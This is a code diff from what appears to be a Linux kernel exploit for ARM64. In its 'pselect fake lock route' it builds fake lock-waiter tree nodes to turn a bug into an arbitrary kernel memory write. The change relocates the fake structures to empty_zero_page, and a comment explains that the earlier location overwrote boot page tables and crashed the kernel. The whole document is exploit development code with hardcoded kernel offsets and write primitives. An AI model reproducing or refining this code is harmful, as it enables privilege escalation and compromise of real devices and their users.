@@ -957,8 +957,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
-              stack_task = data_addr(KIMAGE_TEXT_BASE + bt_off + 0x1000);
-              stack_lock = data_addr(KIMAGE_TEXT_BASE + bt_off);
+              stack_task = data_addr(KIMAGE_TEXT_BASE + 0x29C3000ULL + 0x800);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE + 0x29C3000ULL + 0x100);
               stack_prio = 0;
               stack_deadline = 0;
               pr_info("stack RESURGE SETTLE: all-0 tree, task=dead_end "
@@ -987,8 +987,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
-              stack_task = data_addr(KIMAGE_TEXT_BASE + bt_off + 0x1000);
-              stack_lock = data_addr(KIMAGE_TEXT_BASE + bt_off +
+              stack_task = data_addr(KIMAGE_TEXT_BASE + 0x29C3000ULL + 0x800);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE + 0x29C3000ULL + 0x200 +
                                      (uint64_t)rot * 8);
               stack_prio = 0;
               stack_deadline = 0;
@@ -1978,12 +1978,13 @@ void do_pselect_fake_lock_route(void) {
      * write = only-right (parent=target-8, child=value, rotating lock).
      */
     if (g_resurge_stage) {
-      uint64_t bt_off =
-          (active_offsets && active_offsets->off_bss_tail_lock)
-              ? (uint64_t)active_offsets->off_bss_tail_lock
-              : 0x02BB9D00ULL;
-      uint64_t dead_task = data_addr(KIMAGE_TEXT_BASE + bt_off + 0x1000);
-      uint64_t wlock = data_addr(KIMAGE_TEXT_BASE + bt_off);
+      /* empty_zero_page (kallsyms 0x29C3000) — GUARANTEED zeroed.
+       * bss_tail was NEVER safe: init_pg_dir sits at bss_tail+0x300
+       * (0xffffffc00abba000) — the settle re-link was writing waiter
+       * pointers INTO THE BOOT PAGE TABLES (the 09-12 KP). */
+      uint64_t ezp_off = 0x29C3000ULL;
+      uint64_t dead_task = data_addr(KIMAGE_TEXT_BASE + ezp_off + 0x800);
+      uint64_t wlock = data_addr(KIMAGE_TEXT_BASE + ezp_off + 0x100);
       uint64_t w0 = 0, w1 = 0, w2 = 0;
       if (g_resurge_stage == 2) {
         uint64_t ztgt = (uint64_t)pselect_write_target();
@@ -1997,7 +1998,7 @@ void do_pselect_fake_lock_route(void) {
         w0 = (ztgt - 8) & ~3ULL; /* red parent = target-8 */
         w1 = val;                 /* right child = VALUE (the write) */
         w2 = 0;
-        wlock = data_addr(KIMAGE_TEXT_BASE + bt_off +
+        wlock = data_addr(KIMAGE_TEXT_BASE + ezp_off + 0x200 +
                           (uint64_t)(g_resurge_rot ? g_resurge_rot : 1) * 8);
         pr_info("RESURGE fdset WRITE rot=%d w0=%016llx w1=%016llx "
                 "lock2=%016llx\n",
